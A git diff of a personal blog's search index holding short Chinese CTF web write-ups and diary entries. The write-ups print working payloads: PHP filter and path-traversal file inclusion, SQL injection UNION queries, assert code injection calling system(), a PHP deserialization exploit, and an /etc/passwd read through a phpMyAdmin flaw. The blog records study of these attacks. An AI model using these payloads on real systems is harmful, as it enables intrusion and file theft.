@@ -24,41 +24,6 @@
       </tags>
   </entry>
   <entry>
-    <title>20210515</title>
-    <url>/posts/9d3f05e0/</url>
-    <content><![CDATA[<h2 id="BUUCTF-极客大挑战-2019-Secret-File"><a href="#BUUCTF-极客大挑战-2019-Secret-File" class="headerlink" title="BUUCTF[极客大挑战 2019]Secret File"></a>BUUCTF[极客大挑战 2019]Secret File</h2><blockquote>
-<p>主要就是文件包含和php伪协议</p>
-</blockquote>
-<p>首先观察网页，一团黑，几个字，F12，发现有个标签跟背景色一样，提示有个Archive_room.php，进去有个按钮一按就跳到了end.php，审查元素有个action.php,用bp抓包</p>
-<pre><code>&lt;html&gt;
-    &lt;!--
-    secr3t.php        
-    --&gt;
-&lt;/html&gt;
-</code></pre>
-<p>提示secr3t.php，进去是php代码，看一圈，经典文件包含</p>
-<p>构造payload:</p>
-<pre><code>?file=php://filter/read=convert.base64-encode/resource=flag.php
-</code></pre>
-<p>base64解码得到flag{66971634-57d7-4de8-a9f2-389057aa5e42}</p>
-<h2 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h2><blockquote>
-<p>代码审计</p>
-</blockquote>
-<p>F12,提示source.php,打开代码审计</p>
-<p>payload:</p>
-<pre><code>file=hint.php?/../../../../../ffffllllaaaagggg
-</code></pre>
-<p>一顿绕过之后，hint.php?/被当成目录，向上跳目录</p>
-]]></content>
-      <categories>
-        <category>ctf每日一题</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>web</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>20210518</title>
     <url>/posts/e38e795d/</url>
     <content><![CDATA[<h2 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h2><blockquote>
@@ -123,6 +88,41 @@ EXECUTE name;  //执行预定义SQL语句
         <tag>ctf</tag>
         <tag>web</tag>
         <tag>sql注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>20210515</title>
+    <url>/posts/9d3f05e0/</url>
+    <content><![CDATA[<h2 id="BUUCTF-极客大挑战-2019-Secret-File"><a href="#BUUCTF-极客大挑战-2019-Secret-File" class="headerlink" title="BUUCTF[极客大挑战 2019]Secret File"></a>BUUCTF[极客大挑战 2019]Secret File</h2><blockquote>
+<p>主要就是文件包含和php伪协议</p>
+</blockquote>
+<p>首先观察网页，一团黑，几个字，F12，发现有个标签跟背景色一样，提示有个Archive_room.php，进去有个按钮一按就跳到了end.php，审查元素有个action.php,用bp抓包</p>
+<pre><code>&lt;html&gt;
+    &lt;!--
+    secr3t.php        
+    --&gt;
+&lt;/html&gt;
+</code></pre>
+<p>提示secr3t.php，进去是php代码，看一圈，经典文件包含</p>
+<p>构造payload:</p>
+<pre><code>?file=php://filter/read=convert.base64-encode/resource=flag.php
+</code></pre>
+<p>base64解码得到flag{66971634-57d7-4de8-a9f2-389057aa5e42}</p>
+<h2 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h2><blockquote>
+<p>代码审计</p>
+</blockquote>
+<p>F12,提示source.php,打开代码审计</p>
+<p>payload:</p>
+<pre><code>file=hint.php?/../../../../../ffffllllaaaagggg
+</code></pre>
+<p>一顿绕过之后，hint.php?/被当成目录，向上跳目录</p>
+]]></content>
+      <categories>
+        <category>ctf每日一题</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>web</tag>
       </tags>
   </entry>
   <entry>
@@ -631,6 +631,24 @@ Submit
       </tags>
   </entry>
   <entry>
+    <title>202108202</title>
+    <url>/posts/3719f1b1/</url>
+    <content><![CDATA[<ol>
+<li>客户端配置了php环境，打算debug，在学习larvel的debug，但是不会弄，还在学</li>
+<li>安装了unbuntu，配置了ssh，用vscode远程连接虚拟机调试</li>
+<li>bugku的web基本做完了，buu上的是真难</li>
+<li>在系统的学习一下web</li>
+<li>搭建了私有云，还行挺流畅</li>
+<li>数学建模停摆了一段时间</li>
+<li>对服务器了解越来越丰富了，单纯宝塔已经无法满足了</li>
+<li>实习报告还没开始写</li>
+</ol>
+]]></content>
+      <categories>
+        <category>随笔</category>
+      </categories>
+  </entry>
+  <entry>
     <title>202108203</title>
     <url>/posts/401ec127/</url>
     <content><![CDATA[<h1 id="NewsCenter"><a href="#NewsCenter" class="headerlink" title="NewsCenter"></a>NewsCenter</h1><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; and 0 union select 1,2,3 #</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">and</span> <span class="number">0</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,TABLE_SCHEMA,TABLE_NAME <span class="keyword">from</span> INFORMATION_SCHEMA.COLUMNS 表 表名</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27; and 0 union select 1,column_name,data_type from information_schema.columns where table_name=&#x27;</span>secret_table<span class="string">&#x27;# 列名</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">and</span> <span class="number">0</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,fl4g <span class="keyword">from</span> secret_table #</span><br></pre></td></tr></table></figure>
@@ -663,24 +681,6 @@ Submit
         <tag>ctf</tag>
         <tag>sql注入</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>202108202</title>
-    <url>/posts/3719f1b1/</url>
-    <content><![CDATA[<ol>
-<li>客户端配置了php环境，打算debug，在学习larvel的debug，但是不会弄，还在学</li>
-<li>安装了unbuntu，配置了ssh，用vscode远程连接虚拟机调试</li>
-<li>bugku的web基本做完了，buu上的是真难</li>
-<li>在系统的学习一下web</li>
-<li>搭建了私有云，还行挺流畅</li>
-<li>数学建模停摆了一段时间</li>
-<li>对服务器了解越来越丰富了，单纯宝塔已经无法满足了</li>
-<li>实习报告还没开始写</li>
-</ol>
-]]></content>
-      <categories>
-        <category>随笔</category>
-      </categories>
   </entry>
   <entry>
     <title>20210827</title>
@@ -733,6 +733,29 @@ Submit
         <tag>ctf</tag>
         <tag>web</tag>
         <tag>反序列化</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>20210901</title>
+    <url>/posts/8a5309dc/</url>
+    <content><![CDATA[<h1 id="mfs"><a href="#mfs" class="headerlink" title="mfs"></a>mfs</h1><blockquote>
+<p>git泄露，代码审计，assert命令执行</p>
+</blockquote>
+<pre><code>pyload: ?page=abc&#39;) or system(&quot;tac templates/flag.php&quot;);//
+</code></pre>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">	<span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="variable">$page</span> = <span class="string">&quot;home&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="string">&quot;templates/&quot;</span> . <span class="variable">$page</span> . <span class="string">&quot;.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// I heard &#x27;..&#x27; is dangerous!</span></span><br><span class="line">assert(<span class="string">&quot;strpos(&#x27;<span class="subst">$file</span>&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Detected hacking attempt!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> Make this look nice</span></span><br><span class="line">assert(<span class="string">&quot;file_exists(&#x27;<span class="subst">$file</span>&#x27;)&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;That file doesn&#x27;t exist!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<pre><code>python2 GitHack.py http://114.67.246.176:10015/.git/
+</code></pre>
+<p>先用githack,爬取.git,发现存在flag.php,利用assert代码执行，先用’)将strops闭合，<br>然后执行后面的</p>
+]]></content>
+      <categories>
+        <category>ctf每日一题</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>web</tag>
+        <tag>rce</tag>
       </tags>
   </entry>
   <entry>
@@ -797,29 +820,6 @@ Submit
       </tags>
   </entry>
   <entry>
-    <title>20210901</title>
-    <url>/posts/8a5309dc/</url>
-    <content><![CDATA[<h1 id="mfs"><a href="#mfs" class="headerlink" title="mfs"></a>mfs</h1><blockquote>
-<p>git泄露，代码审计，assert命令执行</p>
-</blockquote>
-<pre><code>pyload: ?page=abc&#39;) or system(&quot;tac templates/flag.php&quot;);//
-</code></pre>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">	<span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="variable">$page</span> = <span class="string">&quot;home&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="string">&quot;templates/&quot;</span> . <span class="variable">$page</span> . <span class="string">&quot;.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// I heard &#x27;..&#x27; is dangerous!</span></span><br><span class="line">assert(<span class="string">&quot;strpos(&#x27;<span class="subst">$file</span>&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Detected hacking attempt!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> Make this look nice</span></span><br><span class="line">assert(<span class="string">&quot;file_exists(&#x27;<span class="subst">$file</span>&#x27;)&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;That file doesn&#x27;t exist!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<pre><code>python2 GitHack.py http://114.67.246.176:10015/.git/
-</code></pre>
-<p>先用githack,爬取.git,发现存在flag.php,利用assert代码执行，先用’)将strops闭合，<br>然后执行后面的</p>
-]]></content>
-      <categories>
-        <category>ctf每日一题</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>web</tag>
-        <tag>rce</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>20210907</title>
     <url>/posts/6330ace9/</url>
     <content><![CDATA[<h1 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h1><p>利用了namp一个参数，将一句话写入文件，rce</p>
@@ -881,6 +881,39 @@ Submit
       </tags>
   </entry>
   <entry>
+    <title>20210927</title>
+    <url>/posts/5106ce6b/</url>
+    <content><![CDATA[<h2 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h2><blockquote>
+<p>php模板注入</p>
+</blockquote>
+<p>php存在模板注入漏洞，不仅python有，php也有</p>
+<p>该题是通过xff的方式获取的本机ip，在这里测试是否有模板注入，测试49，能执行说明存在，然后cat /flag就行，本来打算反弹个shell玩玩呢，结果一个都不能用。</p>
+<h2 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h2><blockquote>
+<p>反序列化绕过</p>
+</blockquote>
+<p>这题本来也想反弹个shell，也是弹了半天没谈过来。。</p>
+<p>直接cat flag也没有，只能find命令了</p>
+<p>先抓包，怀疑可能有call_user_func，随便试了几个都被过滤了，file_get_contents没被禁，获取index.php源码，代码审计</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$disable_fun</span> = <span class="keyword">array</span>(<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;shell_exec&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;passthru&quot;</span>,<span class="string">&quot;proc_open&quot;</span>,<span class="string">&quot;show_source&quot;</span>,<span class="string">&quot;phpinfo&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;dl&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;proc_terminate&quot;</span>,<span class="string">&quot;touch&quot;</span>,<span class="string">&quot;escapeshellcmd&quot;</span>,<span class="string">&quot;escapeshellarg&quot;</span>,<span class="string">&quot;assert&quot;</span>,<span class="string">&quot;substr_replace&quot;</span>,<span class="string">&quot;call_user_func_array&quot;</span>,<span class="string">&quot;call_user_func&quot;</span>,<span class="string">&quot;array_filter&quot;</span>, <span class="string">&quot;array_walk&quot;</span>,  <span class="string">&quot;array_map&quot;</span>,<span class="string">&quot;registregister_shutdown_function&quot;</span>,<span class="string">&quot;register_tick_function&quot;</span>,<span class="string">&quot;filter_var&quot;</span>, <span class="string">&quot;filter_var_array&quot;</span>, <span class="string">&quot;uasort&quot;</span>, <span class="string">&quot;uksort&quot;</span>, <span class="string">&quot;array_reduce&quot;</span>,<span class="string">&quot;array_walk&quot;</span>, <span class="string">&quot;array_walk_recursive&quot;</span>,<span class="string">&quot;pcntl_exec&quot;</span>,<span class="string">&quot;fopen&quot;</span>,<span class="string">&quot;fwrite&quot;</span>,<span class="string">&quot;file_put_contents&quot;</span>); <span class="comment"># 过滤了很多函数，剩了个file_get_contents没被禁</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">gettime</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$p</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$result</span> = call_user_func(<span class="variable">$func</span>, <span class="variable">$p</span>);</span><br><span class="line">        <span class="variable">$a</span>= gettype(<span class="variable">$result</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$a</span> == <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="string">&quot;&quot;</span>;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;Y-m-d h:i:s a&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;func != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> gettime(<span class="keyword">$this</span>-&gt;func, <span class="keyword">$this</span>-&gt;p);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># 可以利用反序列化漏洞</span></span><br><span class="line">    <span class="variable">$func</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;func&quot;</span>];</span><br><span class="line">    <span class="variable">$p</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;p&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$func</span> != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="variable">$func</span> = strtolower(<span class="variable">$func</span>);</span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$func</span>,<span class="variable">$disable_fun</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> gettime(<span class="variable">$func</span>, <span class="variable">$p</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Hacker...&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>写出exp</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;find / -name flag*&quot;</span>; <span class="comment"># 第一部</span></span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;cat /tmp/flagoefiu4r93&quot;</span>; <span class="comment"># 第二部</span></span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> Test();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>得到pyload: </p>
+<pre><code>func=file_get_contents&amp;p=O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:22:&quot;cat /tmp/flagoefiu4r93&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;
+</code></pre>
+]]></content>
+      <categories>
+        <category>ctf每日一题</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>web</tag>
+        <tag>反序列化</tag>
+        <tag>SSTI</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>20210928</title>
     <url>/posts/c1b9d3fa/</url>
     <content><![CDATA[<h2 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h2><blockquote>
@@ -922,39 +955,6 @@ Submit
         <tag>web</tag>
         <tag>代码审计</tag>
         <tag>文件包含</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>20210927</title>
-    <url>/posts/5106ce6b/</url>
-    <content><![CDATA[<h2 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h2><blockquote>
-<p>php模板注入</p>
-</blockquote>
-<p>php存在模板注入漏洞，不仅python有，php也有</p>
-<p>该题是通过xff的方式获取的本机ip，在这里测试是否有模板注入，测试49，能执行说明存在，然后cat /flag就行，本来打算反弹个shell玩玩呢，结果一个都不能用。</p>
-<h2 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h2><blockquote>
-<p>反序列化绕过</p>
-</blockquote>
-<p>这题本来也想反弹个shell，也是弹了半天没谈过来。。</p>
-<p>直接cat flag也没有，只能find命令了</p>
-<p>先抓包，怀疑可能有call_user_func，随便试了几个都被过滤了，file_get_contents没被禁，获取index.php源码，代码审计</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$disable_fun</span> = <span class="keyword">array</span>(<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;shell_exec&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;passthru&quot;</span>,<span class="string">&quot;proc_open&quot;</span>,<span class="string">&quot;show_source&quot;</span>,<span class="string">&quot;phpinfo&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;dl&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;proc_terminate&quot;</span>,<span class="string">&quot;touch&quot;</span>,<span class="string">&quot;escapeshellcmd&quot;</span>,<span class="string">&quot;escapeshellarg&quot;</span>,<span class="string">&quot;assert&quot;</span>,<span class="string">&quot;substr_replace&quot;</span>,<span class="string">&quot;call_user_func_array&quot;</span>,<span class="string">&quot;call_user_func&quot;</span>,<span class="string">&quot;array_filter&quot;</span>, <span class="string">&quot;array_walk&quot;</span>,  <span class="string">&quot;array_map&quot;</span>,<span class="string">&quot;registregister_shutdown_function&quot;</span>,<span class="string">&quot;register_tick_function&quot;</span>,<span class="string">&quot;filter_var&quot;</span>, <span class="string">&quot;filter_var_array&quot;</span>, <span class="string">&quot;uasort&quot;</span>, <span class="string">&quot;uksort&quot;</span>, <span class="string">&quot;array_reduce&quot;</span>,<span class="string">&quot;array_walk&quot;</span>, <span class="string">&quot;array_walk_recursive&quot;</span>,<span class="string">&quot;pcntl_exec&quot;</span>,<span class="string">&quot;fopen&quot;</span>,<span class="string">&quot;fwrite&quot;</span>,<span class="string">&quot;file_put_contents&quot;</span>); <span class="comment"># 过滤了很多函数，剩了个file_get_contents没被禁</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">gettime</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$p</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$result</span> = call_user_func(<span class="variable">$func</span>, <span class="variable">$p</span>);</span><br><span class="line">        <span class="variable">$a</span>= gettype(<span class="variable">$result</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$a</span> == <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="string">&quot;&quot;</span>;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;Y-m-d h:i:s a&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;func != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> gettime(<span class="keyword">$this</span>-&gt;func, <span class="keyword">$this</span>-&gt;p);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># 可以利用反序列化漏洞</span></span><br><span class="line">    <span class="variable">$func</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;func&quot;</span>];</span><br><span class="line">    <span class="variable">$p</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;p&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$func</span> != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="variable">$func</span> = strtolower(<span class="variable">$func</span>);</span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$func</span>,<span class="variable">$disable_fun</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> gettime(<span class="variable">$func</span>, <span class="variable">$p</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Hacker...&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>写出exp</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;find / -name flag*&quot;</span>; <span class="comment"># 第一部</span></span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;cat /tmp/flagoefiu4r93&quot;</span>; <span class="comment"># 第二部</span></span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> Test();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>得到pyload: </p>
-<pre><code>func=file_get_contents&amp;p=O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:22:&quot;cat /tmp/flagoefiu4r93&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;
-</code></pre>
-]]></content>
-      <categories>
-        <category>ctf每日一题</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>web</tag>
-        <tag>反序列化</tag>
-        <tag>SSTI</tag>
       </tags>
   </entry>
   <entry>
@@ -1004,34 +1004,6 @@ Submit
       </tags>
   </entry>
   <entry>
-    <title>20211018</title>
-    <url>/posts/5df9dcd3/</url>
-    <content><![CDATA[<h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2>]]></content>
-      <categories>
-        <category>ctf每日一题</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>20211031</title>
-    <url>/posts/161306f5/</url>
-    <content><![CDATA[<p>失眠了，想了想不知道干什么</p>
-<p>刚开始玩了会古墓丽影，不想玩了</p>
-<p>想到前段时间服务器好像坏了，又修了修，重新在服务器上把博客搭好了</p>
-<p>现在博客Github上和服务器上的都能用</p>
-<p>之所以保留Github是因为足够稳定，用的是一级域名，<a href="https://haorical.xyz/">https://haorical.xyz</a></p>
-<p>服务器用的阿里云，国内比较快，用的二级域名，<a href="http://blog.haorical.xyz/">http://blog.haorical.xyz</a></p>
-<p>暂时没部署证书，以后再弄吧，现在不想弄了。</p>
-<p>又不知道干啥了，过两天生日，一点感觉都没有，明天还得复习线代还得打比赛。。。</p>
-]]></content>
-      <categories>
-        <category>随笔</category>
-      </categories>
-  </entry>
-  <entry>
     <title>20211117</title>
     <url>/posts/cc84ab75/</url>
     <content><![CDATA[<h2 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h2><p>先上传几个正常图片测试，jpeg能用</p>
@@ -1063,6 +1035,34 @@ var_dump(file_get_contents(&quot;/flag&quot;));
       </tags>
   </entry>
   <entry>
+    <title>20211018</title>
+    <url>/posts/5df9dcd3/</url>
+    <content><![CDATA[<h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2>]]></content>
+      <categories>
+        <category>ctf每日一题</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>20211031</title>
+    <url>/posts/161306f5/</url>
+    <content><![CDATA[<p>失眠了，想了想不知道干什么</p>
+<p>刚开始玩了会古墓丽影，不想玩了</p>
+<p>想到前段时间服务器好像坏了，又修了修，重新在服务器上把博客搭好了</p>
+<p>现在博客Github上和服务器上的都能用</p>
+<p>之所以保留Github是因为足够稳定，用的是一级域名，<a href="https://haorical.xyz/">https://haorical.xyz</a></p>
+<p>服务器用的阿里云，国内比较快，用的二级域名，<a href="http://blog.haorical.xyz/">http://blog.haorical.xyz</a></p>
+<p>暂时没部署证书，以后再弄吧，现在不想弄了。</p>
+<p>又不知道干啥了，过两天生日，一点感觉都没有，明天还得复习线代还得打比赛。。。</p>
+]]></content>
+      <categories>
+        <category>随笔</category>
+      </categories>
+  </entry>
+  <entry>
     <title>20211118</title>
     <url>/posts/5c3bb6e4/</url>
     <content><![CDATA[<h2 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h2><p>上传.htaccess </p>
@@ -1078,54 +1078,6 @@ var_dump(file_get_contents(&quot;/flag&quot;));
 </code></pre>
 <h2 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h2><p>xxe</p>
 ]]></content>
-  </entry>
-  <entry>
-    <title>20211129</title>
-    <url>/posts/11d5b1/</url>
-    <content><![CDATA[<h2 id="GWCTF-2019-我有一个数据库"><a href="#GWCTF-2019-我有一个数据库" class="headerlink" title="[GWCTF 2019]我有一个数据库"></a>[GWCTF 2019]我有一个数据库</h2><blockquote>
-<p>phpmyadmin 4.8 cve 文件包含漏洞</p>
-</blockquote>
-<pre><code>?target=db_sql.php%253f/../../../../../../etc/passwd
-</code></pre>
